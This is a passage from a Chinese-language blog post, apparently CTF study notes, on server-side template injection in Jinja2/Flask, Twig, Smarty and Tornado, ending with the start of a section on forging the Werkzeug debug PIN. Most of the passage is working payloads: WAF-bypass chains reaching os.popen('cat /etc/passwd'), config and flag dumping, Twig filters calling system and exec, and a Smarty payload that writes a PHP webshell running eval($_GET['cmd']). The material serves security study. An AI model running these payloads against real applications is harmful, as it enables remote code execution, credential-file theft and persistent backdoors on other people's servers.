class="hljs-string">&#x27;__base__&#x27;</span>][<span class="hljs-string">&#x27;__subclasses__&#x27;</span>]()[<span class="hljs-string">&#x27;__getitem__&#x27;</span>](199)[<span class="hljs-string">&#x27;__inti&#x27;</span>][<span class="hljs-string">&#x27;__globals__&#x27;</span>][<span class="hljs-string">&#x27;__getitem__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>)[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat /etc/passwd&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()&#125;&#125;<br><br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">a</span>=<span class="hljs-string">&#x27;__cla&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">b</span>=<span class="hljs-string">&#x27;ss__&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">c</span>=<span class="hljs-string">&#x27;__ba&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">d</span>=<span class="hljs-string">&#x27;se__&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">e</span>=<span class="hljs-string">&#x27;__subcl&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">f</span>=<span class="hljs-string">&#x27;assess__&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">g</span>=<span class="hljs-string">&#x27;__in&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">h</span>=<span class="hljs-string">&#x27;it___&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">i</span>=<span class="hljs-string">&#x27;__gl&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">j</span>=<span class="hljs-string">&#x27;olbals&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">k</span>=<span class="hljs-string">&#x27;po&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">l</span>=<span class="hljs-string">&#x27;pen&#x27;</span>%&#125;&#123;&#123;<span class="hljs-string">&quot;&quot;</span>[a~b][c~d][e~f]()[199][g~h][i~j][<span class="hljs-string">&#x27;os&#x27;</span>][k~l](<span class="hljs-string">&#x27;cat /etc/passwd&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()&#125;&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="过滤器-1"><a href="#过滤器-1" class="headerlink" title="过滤器"></a>过滤器</h3><p><strong>过滤器reverse</strong></p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-15.png"></p><p><strong>过滤器replace和过滤器join</strong></p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-16.png"></p><h3 id="利用python的char"><a href="#利用python的char" class="headerlink" title="利用python的char()"></a>利用python的char()</h3><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-17.png"></p><hr><h2 id="Length过滤器绕过数字过滤"><a href="#Length过滤器绕过数字过滤" class="headerlink" title="Length过滤器绕过数字过滤"></a>Length过滤器绕过数字过滤</h2><p>通过length去计算字符串长度从而得到整数数字</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> a=<span class="hljs-string">&#x27;aaaaaaaaaa&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;a&#125;&#125;</span><span class="language-xml">#10</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> a=<span class="hljs-string">&#x27;aaaaaaaaaa&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span>*<span class="hljs-string">&#x27;aaa&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;a&#125;&#125;</span><span class="language-xml">#30</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> a=<span class="hljs-string">&#x27;aaaaaaaaaa&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span>*<span class="hljs-string">&#x27;aaaaaaaaaaaa&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span>-<span class="hljs-string">&#x27;aaa&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;a&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">10a*12个a-3个a=117个a#117</span><br><span class="language-xml">也可以用+</span><br></code></pre></td></tr></table></figure><p><strong>绕过数字过滤</strong></p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-18.png"></p><hr><h2 id="获取config文件"><a href="#获取config文件" class="headerlink" title="获取config文件"></a>获取config文件</h2><h3 id="config"><a href="#config" class="headerlink" title="config"></a><strong>config</strong></h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>flag可能隐藏在config文件内</p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-19.png"></p><h3 id="current-app"><a href="#current-app" class="headerlink" title="current_app"></a>current_app</h3><p>如果无法直接调用config</p><p>调用current_app相当与调用flask</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;</span><br></code></pre></td></tr></table></figure><hr><h2 id="混合过滤"><a href="#混合过滤" class="headerlink" title="混合过滤"></a>混合过滤</h2><h3 id="dict-和join"><a href="#dict-和join" class="headerlink" title="dict()和join"></a>dict()和join</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">dict()</span><span class="hljs-comment"># 用来创建一个字典</span><br><span class="hljs-keyword">join:</span><span class="hljs-comment"># 将一个序列中的参数值拼接成字符串</span><br></code></pre></td></tr></table></figure><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> a=dict(benbean=<span class="hljs-number">1</span>)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;a&#125;&#125;</span><span class="language-xml">创建字典a,键名benben，键值1</span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> a=dict(__cla=<span class="hljs-number">1</span>,ss=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;a&#125;&#125;</span><span class="language-xml">创建字典a，join把参数值拼接成字符串</span><br></code></pre></td></tr></table></figure><p>在无法使用引号的情况下，可使用dict()生成字典，配合join或者键名生成字符串</p><p>值不影响，拼接的只是键名</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> a=dict(__cla=<span class="hljs-number">1</span>,ss=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;a&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">使用join拼接出字符串&quot;__class__&quot;</span><br></code></pre></td></tr></table></figure><h3 id="获取符号"><a href="#获取符号" class="headerlink" title="获取符号"></a>获取符号</h3><p>利用flask内置函数和对象获取符号</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> ben= (&#123;&#125;|select()|string()) %&#125;</span><span class="hljs-template-variable">&#123;&#123;ben&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">#获取下划线</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> ben = (self|string()) %&#125;</span><span class="hljs-template-variable">&#123;&#123;ben&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">#获取空格</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> ben = (self|string|<span class="hljs-name">urlencode</span>) %&#125;</span><span class="hljs-template-variable">&#123;&#123;ben&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">#获取百分号</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> ben = (app.__doc__|string) %&#125;</span><span class="hljs-template-variable">&#123;&#123;ben&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-20.png"></p><hr><h3 id="实例解析1"><a href="#实例解析1" class="headerlink" title="实例解析1"></a>实例解析1</h3><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">**用</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> kg=&#123;&#125;<span class="hljs-punctuation">|</span>select()<span class="hljs-punctuation">|</span>string()<span class="hljs-punctuation">|</span>attr(d)(<span class="hljs-number">10</span>)<span class="hljs-template-tag">%&#125;</span><span class="language-xml">得到空格**</span><br></code></pre></td></tr></table></figure><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-21.png"></p><hr><h3 id="实例解析2（WAF过滤’’’，’”‘，’-’，’-’，’-‘，’-’，’-‘）"><a href="#实例解析2（WAF过滤’’’，’”‘，’-’，’-’，’-‘，’-’，’-‘）" class="headerlink" title="实例解析2（WAF过滤’’’，’”‘，’_’，’.’，’[‘，’]’，’ ‘）"></a>实例解析2（WAF过滤’’’，’”‘，’_’，’.’，’[‘，’]’，’ ‘）</h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">使用</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>|string|list&#125;&#125;</span><span class="language-xml">获取符号</span><br></code></pre></td></tr></table></figure><p>第9位是空格，第18位是下划线</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> nine=dict(aaaaaaaaa=a)|<span class="hljs-name">join</span>|count %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> eighteen=nine+nine %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;nine,eighteen&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>9个a统计数量得到数字9<br>计算得到数字18，注意这里不能用length，因为单双引号被过滤了</p><hr><p>获取下划线</p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-22.png"></p><hr><p><strong>全流程</strong></p><p>得到下划线和空格</p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-23.png"></p><p>得到__globals__</p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-24.png"></p><p>得到__getitem__</p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-25.png"></p><p>得到’os’</p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-26.png"></p><p>得到’cat flag’</p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-27.png"></p><p>最后得到read</p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-28.png"></p><p>最终payload：</p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-29.png"></p><hr><h1 id="其他模版"><a href="#其他模版" class="headerlink" title="其他模版"></a>其他模版</h1><h2 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h2><p>文章 - Twig 模板注入从零到一 - 先知社区</p><p>Twig 1.x</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;id&quot;</span>)&#125;&#125;</span><span class="language-xml">//查看id</span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;cat /flag&quot;</span>)&#125;&#125;</span><span class="language-xml">//查看flag</span><br></code></pre></td></tr></table></figure><p>Twig 2.x,3.x</p><p>到了 Twig 2.x &#x2F; 3.x 版本中，__self 变量在 SSTI 中早已失去了他的作用，但我们可以借助新版本中的一些过滤器实现攻击目的。</p><p>在 Twig 3.x 中，map 这个过滤器可以允许用户传递一个箭头函数，并将这个箭头函数应用于序列或映射的元素：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|map(<span class="hljs-name">&quot;system&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|map(<span class="hljs-name">&quot;passthru&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|map(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>使用sort过滤器</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;, 0]</span>|sort(<span class="hljs-name">&quot;system&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;, 0]</span>|sort(<span class="hljs-name">&quot;passthru&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;, 0]</span>|sort(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>使用fitter过滤器</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|filter(<span class="hljs-name">&quot;system&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|filter(<span class="hljs-name">&quot;passthru&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|filter(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>使用reduce过滤器</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[0, 0]</span>|reduce(<span class="hljs-name">&quot;system&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[0, 0]</span>|reduce(<span class="hljs-name">&quot;passthru&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[0, 0]</span>|reduce(<span class="hljs-name">&quot;exec&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">smarty/libs/sysplugins/smarty_internal_data.php　　——&gt;　　getStreamVariable() 这个方法可以获取传入变量的流<br><br><br>&#123;self::getStreamVariable(<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>)&#125;<br><br>写入webshell<br><br><br>&#123;Smarty_Internal_Write_File::writeFile(<span class="hljs-variable">$SCRIPT_NAME</span>,<span class="hljs-string">&quot;&lt;?php eval(<span class="hljs-variable">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,self::clearConfig())&#125;<br><br>&#123;<span class="hljs-variable">$smarty</span>.version&#125;  <span class="hljs-comment">#获取smarty的版本号</span><br>&#123;php&#125;phpinfo();&#123;/php&#125;  <span class="hljs-comment">#执行相应的php代码</span><br><br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;phpinfo();&lt;/script&gt;   <br>&#123;<span class="hljs-keyword">if</span> phpinfo()&#125;&#123;/if&#125;<br><br>查看目录<br>&#123;<span class="hljs-keyword">if</span> system(<span class="hljs-string">&#x27;ls&#x27;</span>)&#125;&#123;/if&#125;<br><br>读取文件<br>&#123;<span class="hljs-keyword">if</span> readfile(<span class="hljs-string">&#x27;/flag&#x27;</span>)&#125;&#123;/if&#125;<br>&#123;<span class="hljs-keyword">if</span> system(<span class="hljs-string">&#x27;tac /flag&#x27;</span>)&#125;&#123;/if&#125;<br></code></pre></td></tr></table></figure><h2 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h2><p><a href="https://blog.csdn.net/miuzzx/article/details/123329244">tornado模版注入全解</a></p><p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量。<br>简单理解handler.settings即可，可以把它理解为tornado模板中内置的环境配置信息名称，通过handler.settings可以访问到环境配置的一些信息，看到tornado模板基本上可以通过handler.settings一把梭。</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">handler.settings</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><hr><h1 id="python-debug-pin码计算"><a href="#python-debug-pin码计算" class="headerlink" title="python debug pin码计算"></a>python debug pin码计算</h1><h2 id="pin码"><a href="#pin码" class="headerlink" title="pin码"></a><strong>pin码</strong></h2><p>对于有文件包含或文件读取的漏洞，且开启debug功能</p><p>想要执行指令还需要输入pin码</p><p>输入pin码后可以输入命令执行可尝试本地构造pin码进入控制台</p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-30.png"></p><h2 id="pin码生成原理"><a href="#pin码生成原理" class="headerlink" title="pin码生成原理"></a>pin码生成原理</h2><p>pin码主要由六个参数构成</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-number">1.</span> username --&gt;执行代码时候的用户名<br><span class="hljs-number">2.</span> getattr(app,<span class="hljs-string">&quot;__name__&quot;</span>,app.__class__.__name__) 固定值默认--&gt;Flask<br><span class="hljs-number">3.</span> modname --&gt;固定值默认flask.app<br><span class="hljs-number">4.</span> getattr<span class="hljs-function"><span class="hljs-params">(mod,<span class="hljs-string">&quot;__file__&quot;</span>,None)</span> --&gt;</span>app.py 文件所在路径<br><span class="hljs-number">5.</span> str<span class="hljs-function"><span class="hljs-params">(uuid.getnode())</span> --&gt;</span>电脑上mac地址<br><span class="hljs-number">6.</span> get_machine_id<span class="hljs-function"><span class="hljs-params">()</span>--&gt;</span>根据操作系统不同，有四种获取方式<br></code></pre></td></tr></table></figure><p>生成pin码Debugger PIN的代码是在 <code>get_pin_and_cookie_name</code></p><hr><h3 id="1、获取用户名username"><a href="#1、获取用户名username" class="headerlink" title="1、获取用户名username"></a>1、获取用户名username</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import getpass<br>username = getpass<span class="hljs-selector-class">.getuser</span>()<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(username)</span></span><br></code></pre></td></tr></table></figure><p>生成username</p><h3 id="2、获取app对象name属性"><a href="#2、获取app对象name属性" class="headerlink" title="2、获取app对象name属性"></a>2、获取app对象name属性</h3><p><code>getattr(app,&quot;__name__&quot;,type(app).__name__)</code></p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-title">app</span>=<span class="hljs-type">Flask</span>(__name__)<br><br><span class="hljs-title">print</span>(getattr(app,<span class="hljs-string">&quot;__name__&quot;</span>,<span class="hljs-keyword">type</span>(app).__name__))<br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">获取的是当前app对象的<span class="hljs-emphasis">__name__</span>属性，<br>若不存在则获取类的<span class="hljs-emphasis">__name__</span>属性，<br>默认为Flask<br></code></pre></td></tr></table></figure><h3 id="3、获取app对象module属性"><a href="#3、获取app对象module属性" class="headerlink" title="3、获取app对象module属性"></a>3、获取app对象module属性</h3><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> <span class="hljs-type">Flask</span><br><span class="hljs-keyword">import</span> typing <span class="hljs-keyword">as</span> t<br>app=<span class="hljs-type">Flask</span>(__name__)<br><br>modname = getattr(app,<span class="hljs-string">&quot;__module__&quot;</span>,t.<span class="hljs-keyword">cast</span>(<span class="hljs-keyword">object</span>,app).__class__.__module__)<br><span class="hljs-keyword">mod</span> = sys.modules.get(modname)<br><br>print(<span class="hljs-keyword">mod</span>)<br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">取的是app对象的<span class="hljs-emphasis">__module__</span>属性，<br>若不存在的话取类的<span class="hljs-emphasis">__module__</span>属性<br>默认为flask.php<br></code></pre></td></tr></table></figure><h3 id="4、mod的-file-属性"><a href="#4、mod的-file-属性" class="headerlink" title="4、mod的__file__属性"></a>4、mod的__file__属性</h3><p>app.py文件所在路径</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">import</span> typing as t<br>app = Flask(__name__)<br><br>modname = getattr(app,<span class="hljs-string">&quot;__module__&quot;</span>,t.cast(object,app).__class__.__module__)<br>mod = sys.<span class="hljs-built_in">module</span>.get(modname)<br><br><span class="hljs-built_in">print</span>(getattr(mod,<span class="hljs-string">&quot;__file__&quot;</span>,None))<br><br>#<span class="hljs-name">C</span>:\Users\mcc06\Downloads\sstilabs-master\venv\lib\site-packages\flask\app.py<br></code></pre></td></tr></table></figure><h3 id="5、uuid"><a href="#5、uuid" class="headerlink" title="5、uuid"></a>5、uuid</h3><p>实际上就是当前网卡的物理地址的整型</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">import</span> <span class="hljs-variable">uuid</span> <br><br><span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-title">str</span>(<span class="hljs-title">hex</span>(<span class="hljs-variable">uuid.getnode</span>())))</span><br></code></pre></td></tr></table></figure><h3 id="6、get-machine-id获取"><a href="#6、get-machine-id获取" class="headerlink" title="6、get_machine_id获取"></a>6、get_machine_id获取</h3><p>Python flask版本不同，读取顺序也不同</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-type">Linux</span><span class="hljs-regexp">/etc/</span>machine<span class="hljs-operator">-</span>id,<span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernl/</span>random<span class="hljs-operator">/</span>boot_id前者固定后者不固定<br><br>docker<span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-operator">/</span>cgroup正则分割<br><br>macOSioreg <span class="hljs-operator">-</span>c <span class="hljs-type">IOPIatformExpertDevice</span> <span class="hljs-operator">-</span>d <span class="hljs-number">2</span><span class="hljs-string">&quot;serial-number&quot;</span> <span class="hljs-operator">=</span> <span class="hljs-operator">&lt;</span> &#123;<span class="hljs-type">ID</span>&#125;部分<br><br>windows<span class="hljs-type">HKEY_LOCAL_MACHINE</span><span class="hljs-regexp">/SOFTWARE/</span><span class="hljs-type">Microsoft</span><span class="hljs-regexp">/Cryptography/</span><span class="hljs-type">MachineGuid</span>  ]注册表<br></code></pre></td></tr></table></figure><hr><h2 id="pin码生成六参数"><a href="#pin码生成六参数" class="headerlink" title="pin码生成六参数"></a>pin码生成六参数</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-number">1</span>、username 